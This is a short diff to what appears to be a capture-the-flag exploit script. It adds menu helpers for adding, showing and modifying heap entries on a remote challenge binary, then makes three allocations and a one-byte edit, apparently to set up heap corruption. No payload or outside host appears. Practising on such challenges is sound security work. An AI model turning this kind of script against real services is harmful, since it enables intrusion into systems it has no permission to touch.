@@ -12,16 +12,26 @@ def echo( data ):
         y.sendafter( 'ice:' , '1' )
         y.sendafter( 'say:' , data )
 
-def add( data , idx ):
+def add( idx , data ):
         y.sendafter( 'ice:' , '2' )
         y.sendafter( '?:' , str( idx ) )
         y.sendafter( ':' , data )
 
-def add( data , idx ):
+def sho( idx ):
         y.sendafter( 'ice:' , '3' )
         y.sendafter( '?:' , str( idx ) )
 
+def mod( idx , data ):
+        y.sendafter( 'ice:' , '4' )
+        y.sendafter( '?:' , str( idx ) )
+        y.sendafter( ':' , data )
 
+
+add( 1 , 'a' * 0x10 )
+add( 2 , 'b' * 0x10 )
+add( 3 , 'c' * 0x10 )
+
+mod( 1 , 'a' )
 
 
 
